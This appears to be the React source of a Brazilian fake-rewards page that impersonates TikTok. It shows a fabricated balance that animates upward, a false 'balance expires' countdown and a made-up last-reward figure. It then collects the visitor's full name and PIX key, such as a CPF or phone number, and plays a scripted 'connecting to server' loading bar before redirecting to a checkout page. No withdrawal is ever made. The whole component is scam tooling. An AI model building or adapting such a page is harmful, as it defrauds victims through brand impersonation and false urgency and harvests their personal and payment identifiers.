import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ChevronRight, CreditCard } from "lucide-react";
import { Progress } from "@/components/ui/progress";
import pixLogoIcon from "@/assets/pix-logo-icon.png";
import pixLogoIcon2 from "@/assets/pix-logo-icon-2.png";
import coinLargeImg from "@/assets/coin-large.png";
import tiktokLogo from "@/assets/tiktok-logo.png";
import roseImg from "@/assets/rose-3d.png";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";

import { TARGET_BALANCE, POINTS } from "@/lib/constants";

const TARGET = TARGET_BALANCE;
const FONT = "Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial, sans-serif";

const withdrawOptions = ["R$1,5", "R$5", "R$10"];

type Step = "main" | "method" | "form" | "loading";

const formatBRL = (v: number) =>
  v.toLocaleString("pt-BR", { minimumFractionDigits: 2, maximumFractionDigits: 2 });

const Pix = () => {
  const [value, setValue] = useState(0);
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(15 * 60 + 8);
  const [step, setStep] = useState<Step>("main");
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [loadingStep, setLoadingStep] = useState(0);
  const [nome, setNome] = useState("");
  const [tipoChave, setTipoChave] = useState("");
  const [chavePix, setChavePix] = useState("");
  const [chaveError, setChaveError] = useState("");
  const navigate = useNavigate();

  const formatCPF = (v: string) => {
    const digits = v.replace(/\D/g, "").slice(0, 11);
    return digits
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
  };

  const formatPhone = (v: string) => {
    const digits = v.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 2) return digits;
    if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
  };

  const handleChaveChange = (raw: string) => {
    setChaveError("");
    if (tipoChave === "cpf") {
      setChavePix(formatCPF(raw));
    } else if (tipoChave === "telefone") {
      setChavePix(formatPhone(raw));
    } else {
      setChavePix(raw);
    }
  };

  const isChaveValid = (): boolean => {
    if (!chavePix.trim() || !tipoChave) return false;
    if (tipoChave === "cpf") return chavePix.replace(/\D/g, "").length === 11;
    if (tipoChave === "email") return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(chavePix.trim());
    if (tipoChave === "telefone") {
      const digits = chavePix.replace(/\D/g, "");
      return digits.length >= 10 && digits.length <= 11;
    }
    if (tipoChave === "aleatoria") return /^[a-f0-9-]{32,36}$/i.test(chavePix.trim());
    return true;
  };

  const validateChave = (): boolean => {
    if (!chavePix.trim()) return false;
    if (tipoChave === "cpf") {
      const digits = chavePix.replace(/\D/g, "");
      if (digits.length !== 11) { setChaveError("CPF deve ter 11 dígitos"); return false; }
    } else if (tipoChave === "email") {
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(chavePix.trim())) { setChaveError("E-mail inválido"); return false; }
    } else if (tipoChave === "telefone") {
      const digits = chavePix.replace(/\D/g, "");
      if (digits.length < 10 || digits.length > 11) { setChaveError("Telefone inválido"); return false; }
    } else if (tipoChave === "aleatoria") {
      if (!/^[a-f0-9-]{32,36}$/i.test(chavePix.trim())) { setChaveError("Chave aleatória inválida"); return false; }
    }
    return true;
  };

  const getPlaceholder = () => {
    switch (tipoChave) {
      case "cpf": return "000.000.000-00";
      case "email": return "exemplo@email.com";
      case "telefone": return "(00) 00000-0000";
      case "aleatoria": return "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx";
      default: return "Digite sua chave PIX";
    }
  };

  const getInputType = () => {
    if (tipoChave === "email") return "email";
    if (tipoChave === "telefone" || tipoChave === "cpf") return "tel";
    return "text";
  };

  // Animate saldo
  useEffect(() => {
    trackTikTokEvent({ event: "ViewContent", properties: { page: "pix", content_type: "withdraw" } });
    const duration = 2000;
    const steps = 60;
    const increment = TARGET / steps;
    let current = 0;
    const interval = setInterval(() => {
      current += increment;
      if (current >= TARGET) {
        setValue(TARGET);
        clearInterval(interval);
      } else {
        setValue(current);
      }
    }, duration / steps);
    return () => clearInterval(interval);
  }, []);

  // Countdown
  useEffect(() => {
    const interval = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  const loadingMessages = [
    "Validando dados...",
    "Conectando ao servidor...",
    "Concluindo resgate...",
    "Quase pronto..."
  ];

  // Loading progress & steps
  useEffect(() => {
    if (step !== "loading") return;
    setLoadingStep(0);
    setLoadingProgress(0);

    const stepInterval = setInterval(() => {
      setLoadingStep((prev) => {
        if (prev >= 3) { clearInterval(stepInterval); return 3; }
        return prev + 1;
      });
    }, 2000);

    const progressInterval = setInterval(() => {
      setLoadingProgress((prev) => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          setTimeout(() => navigate("/checkout"), 500);
          return 100;
        }
        return prev + 1.25;
      });
    }, 100);

    return () => { clearInterval(stepInterval); clearInterval(progressInterval); };
  }, [step, navigate]);

  const mins = Math.floor(countdown / 60);
  const secs = countdown % 60;
  const pad = (n: number) => String(n).padStart(2, "0");

  const fullAmount = `R$ ${formatBRL(TARGET)}`;
  const isFullSelected = selectedAmount === fullAmount;

  // ─── Tela 3: Loading ───
  if (step === "loading") {
    return (
      <div
        style={{
          fontFamily: FONT,
          position: "fixed",
          inset: 0,
          zIndex: 50,
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          background: "#FFFFFF",
          padding: "0 24px",
        }}
      >
        <img src={tiktokLogo} alt="TikTok" style={{ height: 28, marginBottom: 64 }} loading="eager" decoding="async" />
        <div style={{ width: "100%", maxWidth: 280, display: "flex", flexDirection: "column", alignItems: "center", gap: 24 }}>
          <p style={{ fontSize: 17.6, fontWeight: 500, color: "#333333", textAlign: "center" }}>
            {loadingMessages[loadingStep] || loadingMessages[3]}
          </p>
          <div style={{ width: "100%", height: 5, borderRadius: 3, background: "#F5F5F5", overflow: "hidden" }}>
            <div
              style={{
                width: `${Math.min(loadingProgress, 100)}%`,
                height: "100%",
                borderRadius: 3,
                background: "#FE2C55",
                transition: "width 0.1s linear",
              }}
            />
          </div>
        </div>
      </div>
    );
  }

  // ─── Tela 2: Resgatar Recompensas ───
  return (
    <div
      style={{
        fontFamily: FONT,
        background: "#F5F5F5",
        minHeight: "100vh",
        display: "flex",
        flexDirection: "column",
      }}
    >
      {/* Banner de expiração */}
      <div style={{ background: "#000", padding: "10px 0", textAlign: "center" }}>
        <p style={{ fontSize: 12, fontWeight: 600, color: "#fff", letterSpacing: "0.05em", margin: 0, display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
          SEU SALDO EXPIRA EM
          {["00", pad(mins), pad(secs)].map((v, i) => (
            <span key={i} style={{ display: "inline-flex", alignItems: "center", gap: 4 }}>
              {i > 0 && <span style={{ color: "#fff" }}>-</span>}
              <span
                style={{
                  background: "#E6E6E6",
                  color: "#000",
                  fontWeight: 700,
                  fontSize: 10,
                  padding: "2px 6px",
                  borderRadius: 3,
                }}
              >
                {v}
              </span>
            </span>
          ))}
        </p>
      </div>

      {/* Título */}
      <h1 style={{ fontSize: 16, fontWeight: 600, color: "#000", textAlign: "center", padding: "20px 0", margin: 0 }}>
        Resgatar recompensas
      </h1>

      <div style={{ padding: "0 12px 110px", maxWidth: 449, margin: "0 auto", width: "100%" }}>
        {/* Card Preto de Saldo */}
        <div
          style={{
            background: "#000000",
            borderRadius: 10,
            padding: 20,
            marginBottom: 10,
          }}
        >
          <p style={{ fontSize: 14, fontWeight: 500, color: "#444", margin: "0 0 4px" }}>Seu saldo</p>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div>
              <p style={{ fontSize: 22, fontWeight: 700, color: "#fff", margin: 0 }}>
                R$ {formatBRL(value)}
              </p>
              <p style={{ fontSize: 12, fontWeight: 400, color: "rgba(255,255,255,0.5)", margin: "4px 0 0" }}>
                = {POINTS.toLocaleString("pt-BR")} pontos
              </p>
            </div>
            <img src={coinLargeImg} alt="P" style={{ width: 56, height: 56, objectFit: "contain" }} loading="eager" decoding="async" />
          </div>
        </div>

        {/* Card Preto Última Recompensa */}
        <div
          style={{
            background: "#000000",
            borderRadius: 10,
            padding: "10px 20px",
            marginBottom: 16,
          }}
        >
          <p style={{ fontSize: 13, fontWeight: 500, color: "#fff", margin: 0 }}>
            Última recompensa: R$ 646,43
          </p>
        </div>

        {/* Card Branco - Sacar dinheiro */}
        <div
          style={{
            background: "rgba(255,255,255,0.95)",
            borderRadius: 8,
            padding: 20,
            marginBottom: 16,
          }}
        >
          <h2 style={{ fontSize: 16, fontWeight: 700, color: "#020817", margin: "0 0 8px" }}>Sacar dinheiro</h2>
          <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 16 }}>
            <CreditCard size={16} color="#666" />
            <span style={{ fontSize: 12, color: "#666" }}>Transferência via</span>
            <img src={pixLogoIcon} alt="Pix" style={{ height: 16, width: 16 }} loading="eager" decoding="async" />
            <span style={{ fontSize: 12, fontWeight: 700, color: "#00B2A9", textTransform: "uppercase" }}>pix</span>
          </div>

          {/* Botões de valor */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 10, marginBottom: 10 }}>
            {withdrawOptions.map((opt) => (
              <button
                key={opt}
                onClick={() => setSelectedAmount(opt)}
                style={{
                  background: selectedAmount === opt ? "rgba(254,43,84,0.08)" : "#F0F2F5",
                  border: selectedAmount === opt ? "1.5px solid #FE2B54" : "1.5px solid transparent",
                  borderRadius: 6,
                  padding: "12px 0",
                  fontSize: 14,
                  fontWeight: 700,
                  color: selectedAmount === opt ? "#FE2B54" : "#020817",
                  cursor: "pointer",
                  fontFamily: FONT,
                }}
              >
                {opt}
              </button>
            ))}
          </div>

          {/* Valor total */}
          <button
            onClick={() => setSelectedAmount(fullAmount)}
            style={{
              width: "100%",
              background: isFullSelected ? "rgba(254,43,84,0.08)" : "#F0F2F5",
              border: isFullSelected ? "1.5px solid #FE2B54" : "1.5px solid transparent",
              borderRadius: 8,
              padding: "12px 0",
              fontSize: 14,
              fontWeight: 700,
              color: isFullSelected ? "#FE2B54" : "#020817",
              cursor: "pointer",
              marginBottom: 12,
              fontFamily: FONT,
            }}
          >
            {fullAmount}
          </button>

          {/* Botão Sacar */}
          <button
            onClick={() => setStep("method")}
            disabled={!selectedAmount}
            style={{
              width: "100%",
              background: selectedAmount ? "#FE2B54" : "#F1F1F3",
              color: selectedAmount ? "#fff" : "#D4D4D4",
              border: "none",
              borderRadius: 8,
              padding: "14px 0",
              fontSize: 15,
              fontWeight: 600,
              cursor: selectedAmount ? "pointer" : "default",
              fontFamily: FONT,
            }}
          >
            Sacar dinheiro
          </button>

          <p style={{ fontSize: 12, color: "#666", textAlign: "center", marginTop: 14, lineHeight: 1.5 }}>
            Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
          </p>
        </div>

        {/* Card - Moedas para LIVE */}
        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 8,
            padding: 20,
            marginBottom: 16,
          }}
        >
          <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between" }}>
            <div style={{ flex: 1 }}>
              <h2 style={{ fontSize: 15, fontWeight: 700, color: "#020817", margin: "0 0 4px" }}>
                Obtenha Moedas para a LIVE
              </h2>
              <p style={{ fontSize: 12, color: "#666", lineHeight: 1.5, margin: 0 }}>
                Use Moedas para enviar presentes virtuais para seus hosts de live Favoritos.
              </p>
            </div>
            <img src={roseImg} alt="Rosa" style={{ width: 44, height: 44, objectFit: "contain" }} loading="eager" decoding="async" />
          </div>
          <button
            disabled
            style={{
              width: "100%",
              marginTop: 16,
              background: "#F1F1F3",
              border: "none",
              borderRadius: 8,
              padding: "12px 0",
              fontSize: 13,
              fontWeight: 500,
              color: "#D4D4D4",
              cursor: "default",
              fontFamily: FONT,
            }}
          >
            Indisponível
          </button>
        </div>

        {/* Card - Recarga Móvel */}
        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 8,
            padding: 20,
          }}
        >
          <h2 style={{ fontSize: 15, fontWeight: 700, color: "#020817", margin: "0 0 8px" }}>
            Recarga Móvel
          </h2>
          <div style={{ display: "flex", gap: 8, marginBottom: 12 }}>
            <input
              placeholder="DDD"
              disabled
              style={{
                width: 60,
                background: "#F0F2F5",
                border: "1.5px solid #E2E8F0",
                borderRadius: 6,
                padding: "10px 12px",
                fontSize: 13,
                color: "#999",
                fontFamily: FONT,
              }}
            />
            <input
              placeholder="Número de telefone"
              disabled
              style={{
                flex: 1,
                background: "#F0F2F5",
                border: "1.5px solid #E2E8F0",
                borderRadius: 6,
                padding: "10px 12px",
                fontSize: 13,
                color: "#999",
                fontFamily: FONT,
              }}
            />
          </div>
          <button
            disabled
            style={{
              width: "100%",
              background: "#F1F1F3",
              border: "none",
              borderRadius: 8,
              padding: "12px 0",
              fontSize: 13,
              fontWeight: 500,
              color: "#D4D4D4",
              cursor: "default",
              fontFamily: FONT,
            }}
          >
            Indisponível
          </button>
        </div>
      </div>

      {/* ─── Bottom Sheet: Adicionar método de saque ─── */}
      {step === "method" && (
        <div
          onClick={() => setStep("main")}
          style={{
            position: "fixed",
            inset: 0,
            zIndex: 50,
            display: "flex",
            alignItems: "flex-end",
            background: "rgba(0,0,0,0.4)",
          }}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              width: "100%",
              borderRadius: "16px 16px 0 0",
              background: "#fff",
              padding: 24,
              fontFamily: FONT,
            }}
          >
            <h3 style={{ fontSize: 18, fontWeight: 700, color: "#000", textAlign: "center", margin: "0 0 24px" }}>
              Adicionar método de saque
            </h3>
            <button
              onClick={() => setStep("form")}
              style={{
                width: "100%",
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                border: "2px solid #EA445A",
                borderRadius: 10,
                padding: 16,
                background: "transparent",
                cursor: "pointer",
                fontFamily: FONT,
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                <img src={pixLogoIcon2} alt="Pix" style={{ height: 24, width: 24 }} loading="eager" decoding="async" />
                <div style={{ textAlign: "left" }}>
                  <p style={{ fontSize: 14, fontWeight: 700, color: "#000", margin: 0 }}>PIX</p>
                  <p style={{ fontSize: 12, color: "#666", margin: 0 }}>Recebimento Imediato</p>
                </div>
              </div>
              <ChevronRight size={20} color="#999" />
            </button>
          </div>
        </div>
      )}

      {/* ─── Bottom Sheet: Vincular PIX ─── */}
      {step === "form" && (
        <div
          onClick={() => setStep("main")}
          style={{
            position: "fixed",
            inset: 0,
            zIndex: 50,
            display: "flex",
            alignItems: "flex-end",
            background: "rgba(0,0,0,0.4)",
          }}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              width: "100%",
              borderRadius: "16px 16px 0 0",
              background: "#fff",
              padding: 24,
              fontFamily: FONT,
            }}
          >
            <h3 style={{ fontSize: 18, fontWeight: 700, color: "#000", textAlign: "center", margin: "0 0 24px" }}>
              Vincular PIX
            </h3>

            <div style={{ display: "flex", flexDirection: "column", gap: 20 }}>
              {/* Nome */}
              <div>
                <label style={{ fontSize: 14, fontWeight: 600, color: "#000", display: "block", marginBottom: 4 }}>Nome</label>
                <input
                  value={nome}
                  onChange={(e) => setNome(e.target.value)}
                  placeholder="Nome completo"
                  style={{
                    width: "100%",
                    border: "none",
                    borderBottom: "1px solid #E2E8F0",
                    padding: "8px 0",
                    fontSize: 14,
                    color: "#020817",
                    outline: "none",
                    fontFamily: FONT,
                    background: "transparent",
                  }}
                />
              </div>

              {/* Tipo de Chave */}
              <div>
                <label style={{ fontSize: 14, fontWeight: 600, color: "#000", display: "block", marginBottom: 4 }}>Tipo de Chave PIX</label>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", borderBottom: "1px solid #E2E8F0", paddingBottom: 8 }}>
                  <select
                    value={tipoChave}
                    onChange={(e) => { setTipoChave(e.target.value); setChavePix(""); setChaveError(""); }}
                    style={{
                      width: "100%",
                      fontSize: 14,
                      color: "#020817",
                      outline: "none",
                      background: "transparent",
                      border: "none",
                      fontFamily: FONT,
                      appearance: "none",
                    }}
                  >
                    <option value="" disabled>Escolha o tipo de chave PIX</option>
                    <option value="cpf">CPF</option>
                    <option value="email">E-mail</option>
                    <option value="telefone">Telefone</option>
                    <option value="aleatoria">Chave aleatória</option>
                  </select>
                  <ChevronRight size={16} color="#999" style={{ flexShrink: 0 }} />
                </div>
              </div>

              {/* Chave PIX */}
              <div>
                <label style={{ fontSize: 14, fontWeight: 600, color: "#000", display: "block", marginBottom: 4 }}>Chave PIX</label>
                <input
                  value={chavePix}
                  onChange={(e) => handleChaveChange(e.target.value)}
                  placeholder={getPlaceholder()}
                  type={getInputType()}
                  inputMode={tipoChave === "cpf" || tipoChave === "telefone" ? "numeric" : undefined}
                  style={{
                    width: "100%",
                    border: "none",
                    borderBottom: "1px solid #E2E8F0",
                    padding: "8px 0",
                    fontSize: 14,
                    color: "#020817",
                    outline: "none",
                    fontFamily: FONT,
                    background: "transparent",
                  }}
                />
                {chaveError && <p style={{ fontSize: 12, color: "#FE2B54", marginTop: 4 }}>{chaveError}</p>}
              </div>
            </div>

            {/* Botão Enviar */}
            <button
              onClick={() => {
                if (!validateChave()) return;
                localStorage.setItem("tiktok_nome", nome.trim());
                localStorage.setItem("tiktok_tipo_chave", tipoChave);
                localStorage.setItem("tiktok_chave_pix", chavePix.trim());
                trackTikTokEvent({ event: "SubmitForm", properties: { page: "pix", tipo_chave: tipoChave } });
                setStep("loading");
              }}
              disabled={!nome.trim() || !tipoChave || !chavePix.trim() || !isChaveValid()}
              style={{
                width: "100%",
                marginTop: 24,
                background: (!nome.trim() || !tipoChave || !chavePix.trim() || !isChaveValid()) ? "#F1F1F3" : "#EA445A",
                color: (!nome.trim() || !tipoChave || !chavePix.trim() || !isChaveValid()) ? "#D4D4D4" : "#fff",
                border: "none",
                borderRadius: 8,
                padding: "14px 0",
                fontSize: 15,
                fontWeight: 600,
                cursor: (!nome.trim() || !tipoChave || !chavePix.trim() || !isChaveValid()) ? "default" : "pointer",
                fontFamily: FONT,
              }}
            >
              Enviar
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default Pix;
